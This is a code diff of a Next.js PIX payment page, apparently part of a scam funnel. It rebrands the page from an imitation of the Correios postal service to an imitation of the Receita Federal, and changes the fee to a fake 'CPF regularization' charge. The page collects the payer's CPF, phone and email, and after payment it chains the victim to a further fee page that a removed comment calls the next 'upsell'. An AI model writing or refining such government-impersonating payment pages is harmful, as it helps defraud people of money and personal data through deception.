@@ -2,17 +2,6 @@
 
 import {
   Menu,
-  FileText,
-  Phone,
-  ShoppingCart,
-  HelpCircle,
-  Users,
-  Building,
-  GraduationCap,
-  Shield,
-  Search,
-  Lock,
-  ExternalLink,
   Copy,
   Check,
   Loader2,
@@ -22,9 +11,10 @@ import {
   Smartphone,
   CreditCard,
   ShieldCheck,
+  Lock,
 } from "lucide-react"
-import { useState, useEffect, useCallback } from "react"
-import { useRouter } from "next/navigation"
+import { useState, useEffect, useCallback, Suspense } from "react"
+import { useSearchParams, useRouter } from "next/navigation"
 import { Button } from "@/components/ui/button"
 
 interface PixData {
@@ -35,8 +25,12 @@ interface PixData {
   amountCents: number
 }
 
-export default function PixPage() {
+function PixCPFContent() {
+  const searchParams = useSearchParams()
   const router = useRouter()
+  const placa = searchParams.get("placa") || ""
+  const valor = parseFloat(searchParams.get("valor") || "85.00")
+  
   const [pixData, setPixData] = useState<PixData | null>(null)
   const [loading, setLoading] = useState(true)
   const [error, setError] = useState<string | null>(null)
@@ -79,7 +73,7 @@ export default function PixPage() {
         return
       }
 
-      const response = await fetch("/api/pix", {
+      const response = await fetch("/api/pixcpf", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -89,6 +83,7 @@ export default function PixPage() {
           customerDocument: customerData.cpf,
           customerPhone: customerData.telefone,
           customerEmail: customerData.email,
+          amount: valor,
         }),
       })
 
@@ -110,7 +105,7 @@ export default function PixPage() {
     } finally {
       setLoading(false)
     }
-  }, [])
+  }, [valor])
 
   useEffect(() => {
     if (mounted) {
@@ -123,14 +118,13 @@ export default function PixPage() {
 
     const checkStatus = async () => {
       try {
-        const response = await fetch(`/api/pix?txid=${pixData.txid}`)
+        const response = await fetch(`/api/pixcpf?txid=${pixData.txid}`)
         const data = await response.json()
         if (data.success && data.status) {
           setPaymentStatus(data.status)
           if (data.status === "APPROVED") {
-            // Redirecionar para próximo upsell após pagamento aprovado
             setTimeout(() => {
-              router.push(`/iof?placa=&valor=62.70`)
+              router.push(`/validacao?placa=${placa}&valor=18.25`)
             }, 2000)
           }
         }
@@ -141,7 +135,7 @@ export default function PixPage() {
 
     const interval = setInterval(checkStatus, 5000)
     return () => clearInterval(interval)
-  }, [pixData?.txid, paymentStatus, router])
+  }, [pixData?.txid, paymentStatus, router, placa])
 
   const copyToClipboard = async () => {
     if (!pixData?.copiaECola) return
@@ -171,95 +165,49 @@ export default function PixPage() {
 
   if (!mounted) {
     return (
-      <div className="min-h-screen bg-[#f5f3f0] flex items-center justify-center">
+      <div className="min-h-screen bg-[#1a3a5c] flex items-center justify-center">
         <div className="text-center">
-          <Loader2 className="h-12 w-12 animate-spin text-[#004069] mx-auto" />
-          <p className="mt-4 text-[#004069] font-medium">Carregando...</p>
+          <Loader2 className="h-12 w-12 animate-spin text-[#f0c14b] mx-auto" />
+          <p className="mt-4 text-white font-medium">Carregando...</p>
         </div>
       </div>
     )
   }
 
   return (
-    <div className="min-h-screen bg-[#f5f3f0]" style={{ fontFamily: "Verdana, sans-serif" }}>
+    <div className="min-h-screen bg-[#1a3a5c]" style={{ fontFamily: "Verdana, sans-serif" }}>
       {/* Header */}
-      <header style={{ backgroundColor: "#f5f3f0" }}>
-        <div className="flex items-center justify-between px-4 py-2">
-          <div className="flex items-center gap-4">
-            <button className="text-blue-600 text-sm">Acessibilidade</button>
-          </div>
+      <header className="bg-[#152d47] py-4">
+        <div className="flex justify-center px-4">
+          <img src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/receita%20logo-CcJylic56Yrlq63Gv5cnoS4Bw6Eqm7.png" alt="Receita Federal" className="h-12 w-auto" />
         </div>
-
-        <div className="h-px bg-white w-full"></div>
-
-        <div className="flex items-center justify-between px-4 py-3">
-          <div className="md:hidden flex items-center justify-between w-full">
-            <Menu className="w-6 h-6 text-chart-3" />
-            <img src="/images/correios-logo.png" alt="Correios" className="h-7" />
-            <div className="w-6"></div>
-          </div>
-
-          <div className="hidden md:flex items-center gap-4 flex-1">
-            <Menu className="w-6 h-6 text-chart-3" />
-            <img src="/images/correios-logo.png" alt="Correios" className="h-7" />
-          </div>
-
-          <div className="hidden md:flex items-center gap-2">
-            <div className="bg-gray-300 mr-3 w-px h-[30px]"></div>
-            <img src="/images/login-icon.png" alt="Entrar" className="h-8 w-[41px]" />
-            <span className="text-[rgba(0,63,253,1)] font-light">Entrar</span>
-          </div>
-        </div>
-
-        <div className="bg-[#FFCB05] w-full h-1"></div>
       </header>
 
       {/* Main Content */}
       <main className="max-w-4xl mx-auto px-4 py-6">
-        {/* Breadcrumb */}
-        <nav className="flex items-center gap-2 mb-4 tracking-normal text-base">
-          <span className="md:hidden">
-            <a href="/" className="text-blue-600 hover:underline">
-              {"<"}
-            </a>
-            <span className="text-[#004069] ml-1">Pagamento PIX</span>
-          </span>
-          <div className="hidden md:flex items-center gap-2 text-blue-600">
-            <a href="/" className="hover:underline">
-              Portal Correios
-            </a>
-            <span className="text-[#004069]">{">"}</span>
-            <a href="/" className="hover:underline">
-              Rastreamento
-            </a>
-            <span className="text-[#004069]">{">"}</span>
-            <span className="text-[#004069]">Pagamento PIX</span>
-          </div>
-        </nav>
-
         {/* Title Section */}
-        <div className="bg-[#004069] text-white p-4 mb-0">
+        <div className="bg-[#152d47] text-white p-4 mb-0 rounded-t-lg">
           <div className="flex items-center gap-3">
-            <QrCode className="w-8 h-8 text-[#FFCB05]" />
+            <QrCode className="w-8 h-8 text-[#f0c14b]" />
             <div>
               <h1 className="text-xl md:text-2xl font-bold">Pagamento via PIX</h1>
-              <p className="text-sm text-gray-200">Taxa de Liberação Aduaneira</p>
+              <p className="text-sm text-gray-300">Taxa de Regularização - CPF</p>
             </div>
           </div>
         </div>
 
         {/* Yellow Accent Bar */}
-        <div className="bg-[#FFCB05] h-2 mb-6"></div>
+        <div className="bg-[#f0c14b] h-2 mb-0"></div>
 
         {/* Payment Content */}
-        <div className="bg-white border border-gray-200">
+        <div className="bg-white border border-gray-200 rounded-b-lg">
           {/* Loading State */}
           {loading && (
             <div className="flex flex-col items-center justify-center py-16">
-              <div className="bg-[#004069] rounded-full p-6 mb-6">
-                <Loader2 className="h-12 w-12 animate-spin text-[#FFCB05]" />
+              <div className="bg-[#1a3a5c] rounded-full p-6 mb-6">
+                <Loader2 className="h-12 w-12 animate-spin text-[#f0c14b]" />
               </div>
-              <p className="text-[#004069] text-lg font-bold">Gerando QR Code PIX</p>
+              <p className="text-[#1a3a5c] text-lg font-bold">Gerando QR Code PIX</p>
               <p className="text-gray-500 text-sm mt-2">Aguarde um momento...</p>
             </div>
           )}
@@ -277,7 +225,7 @@ export default function PixPage() {
                     <p className="text-red-700 text-sm mb-4">{error}</p>
                     <Button
                       onClick={generatePix}
-                      className="bg-[#004069] hover:bg-[#003050] text-white"
+                      className="bg-[#1a3a5c] hover:bg-[#152d47] text-white"
                     >
                       Tentar novamente
                     </Button>
@@ -310,11 +258,11 @@ export default function PixPage() {
                 <div className="flex items-center justify-between">
                   <div>
                     <p className="text-sm text-gray-600">Beneficiário</p>
-                    <p className="font-bold text-[#004069]">Correios - Receita Federal</p>
+                    <p className="font-bold text-[#1a3a5c]">Receita Federal - CPF</p>
                   </div>
                   <div className="text-right">
                     <p className="text-sm text-gray-600">Valor total</p>
-                    <p className="text-2xl md:text-3xl font-bold text-[#004069]">
+                    <p className="text-2xl md:text-3xl font-bold text-[#1a3a5c]">
                       {formatCurrency(pixData.amountCents)}
                     </p>
                   </div>
@@ -326,7 +274,7 @@ export default function PixPage() {
                 {customerName && (
                   <div className="bg-[#f8f9fa] border border-gray-200 p-3 mb-6">
                     <p className="text-sm text-gray-600">
-                      Pagador: <span className="font-bold text-[#004069]">{customerName}</span>
+                      Pagador: <span className="font-bold text-[#1a3a5c]">{customerName}</span>
                     </p>
                   </div>
                 )}
@@ -335,8 +283,8 @@ export default function PixPage() {
                 <div className="flex flex-col lg:flex-row gap-8">
                   {/* Left - QR Code */}
                   <div className="flex-1 flex flex-col items-center">
-                    <div className="border-2 border-[#004069] p-1 mb-4">
-                      <div className="border border-[#FFCB05] p-3 bg-white">
+                    <div className="border-2 border-[#1a3a5c] p-1 mb-4">
+                      <div className="border border-[#f0c14b] p-3 bg-white">
                         <img
                           src={pixData.qrCodeBase64}
                           alt="QR Code PIX"
@@ -354,8 +302,8 @@ export default function PixPage() {
                     {/* Copy Section */}
                     <div className="bg-[#f8f9fa] border border-gray-200 p-4 mb-4">
                       <div className="flex items-center gap-2 mb-3">
-                        <Copy className="w-5 h-5 text-[#004069]" />
-                        <p className="font-bold text-[#004069]">PIX Copia e Cola</p>
+                        <Copy className="w-5 h-5 text-[#1a3a5c]" />
+                        <p className="font-bold text-[#1a3a5c]">PIX Copia e Cola</p>
                       </div>
                       <div className="bg-white border border-gray-300 p-3 mb-3 max-h-24 overflow-y-auto">
                         <p className="text-xs text-gray-700 break-all font-mono leading-relaxed">
@@ -367,7 +315,7 @@ export default function PixPage() {
                         className={`w-full font-bold py-3 ${
                           copied
                             ? "bg-green-600 hover:bg-green-700"
-                            : "bg-[#FFCB05] hover:bg-[#e6b800] text-[#004069]"
+                            : "bg-[#f0c14b] hover:bg-[#e0b13b] text-[#1a3a5c]"
                         }`}
                       >
                         {copied ? (
@@ -385,7 +333,7 @@ export default function PixPage() {
                     </div>
 
                     {/* Status */}
-                    <div className="bg-[#fff3cd] border-l-4 border-[#FFCB05] p-4 mb-4">
+                    <div className="bg-[#fff3cd] border-l-4 border-[#f0c14b] p-4 mb-4">
                       <div className="flex items-center gap-2">
                         <Clock className="w-5 h-5 text-[#856404]" />
                         <span className="font-bold text-[#856404]">Aguardando pagamento</span>
@@ -397,25 +345,25 @@ export default function PixPage() {
 
                     {/* Instructions */}
                     <div className="bg-[#e7f3ff] border border-[#b6d4fe] p-4">
-                      <p className="font-bold text-[#004069] mb-3 flex items-center gap-2">
+                      <p className="font-bold text-[#1a3a5c] mb-3 flex items-center gap-2">
                         <Smartphone className="w-5 h-5" />
                         Como pagar:
                       </p>
-                      <ol className="space-y-2 text-sm text-[#004069]">
+                      <ol className="space-y-2 text-sm text-[#1a3a5c]">
                         <li className="flex items-start gap-2">
-                          <span className="bg-[#004069] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">1</span>
+                          <span className="bg-[#1a3a5c] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">1</span>
                           <span>Abra o aplicativo do seu banco</span>
                         </li>
                         <li className="flex items-start gap-2">
-                          <span className="bg-[#004069] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">2</span>
+                          <span className="bg-[#1a3a5c] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">2</span>
                           <span>Acesse a opção PIX</span>
                         </li>
                         <li className="flex items-start gap-2">
-                          <span className="bg-[#004069] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">3</span>
+                          <span className="bg-[#1a3a5c] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">3</span>
                           <span>Escolha QR Code ou Copia e Cola</span>
                         </li>
                         <li className="flex items-start gap-2">
-                          <span className="bg-[#004069] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">4</span>
+                          <span className="bg-[#1a3a5c] text-white rounded-full w-5 h-5 flex items-center justify-center text-xs flex-shrink-0">4</span>
                           <span>Confirme os dados e finalize</span>
                         </li>
                       </ol>
@@ -431,11 +379,11 @@ export default function PixPage() {
                       <span>Pagamento Seguro</span>
                     </div>
                     <div className="flex items-center gap-2">
-                      <CreditCard className="w-5 h-5 text-[#004069]" />
+                      <CreditCard className="w-5 h-5 text-[#1a3a5c]" />
                       <span>PIX Instantâneo</span>
                     </div>
                     <div className="flex items-center gap-2">
-                      <Lock className="w-5 h-5 text-[#004069]" />
+                      <Lock className="w-5 h-5 text-[#1a3a5c]" />
                       <span>Dados Protegidos</span>
                     </div>
                   </div>
@@ -445,83 +393,20 @@ export default function PixPage() {
           )}
         </div>
       </main>
-
-      {/* Footer */}
-      <footer className="bg-[#FFCB05] text-[#004069] py-8 mt-12">
-        <div className="max-w-6xl mx-auto px-4">
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
-            <div>
-              <h3 className="font-bold mb-4 text-lg md:text-xl">Fale Conosco</h3>
-              <ul className="space-y-2">
-                <li className="flex items-center gap-2">
-                  <FileText className="w-4 h-4" />
-                  <span className="font-medium text-sm">Registro de Manifestações</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <Phone className="w-4 h-4" />
-                  <span className="font-medium text-sm">Central de Atendimento</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <ShoppingCart className="w-4 h-4" />
-                  <span className="font-medium text-sm">Soluções para o seu negócio</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <HelpCircle className="w-4 h-4" />
-                  <span className="font-medium text-sm">Suporte ao cliente com contrato</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <Users className="w-4 h-4" />
-                  <span className="font-medium text-sm">Ouvidoria</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <Shield className="w-4 h-4" />
-                  <span className="font-medium text-sm">Denúncia</span>
-                </li>
-              </ul>
-            </div>
-
-            <div>
-              <h3 className="font-bold mb-4 text-lg md:text-xl">Sobre os Correios</h3>
-              <ul className="space-y-2">
-                <li className="flex items-center gap-2">
-                  <Building className="w-4 h-4" />
-                  <span className="font-medium text-sm">Identidade corporativa</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <GraduationCap className="w-4 h-4" />
-                  <span className="font-medium text-sm">Educação e cultura</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <FileText className="w-4 h-4" />
-                  <span className="font-medium text-sm">Código de ética</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <Search className="w-4 h-4" />
-                  <span className="font-medium text-sm">Transparência e prestação de contas</span>
-                </li>
-                <li className="flex items-center gap-2">
-                  <Lock className="w-4 h-4" />
-                  <span className="font-medium text-sm">Política de Privacidade</span>
-                </li>
-              </ul>
-            </div>
-
-            <div>
-              <h3 className="font-bold mb-4 text-lg md:text-xl">Outros Sites</h3>
-              <ul className="space-y-2">
-                <li className="flex items-center gap-2">
-                  <ExternalLink className="w-4 h-4" />
-                  <span className="font-medium text-sm">Loja online dos Correios</span>
-                </li>
-              </ul>
-            </div>
-          </div>
-
-          <div className="text-center mt-8 pt-4 border-t border-[#e6b800]">
-            <p className="text-sm font-medium">© Copyright 2025 Correios - Todos os direitos reservados</p>
-          </div>
-        </div>
-      </footer>
     </div>
+  )
+}
+
+export default function PixCPFPage() {
+  return (
+    <Suspense
+      fallback={
+        <div className="min-h-screen bg-[#1a3a5c] flex items-center justify-center">
+          <Loader2 className="h-12 w-12 animate-spin text-[#f0c14b]" />
+        </div>
+      }
+    >
+      <PixCPFContent />
+    </Suspense>
   )
 }
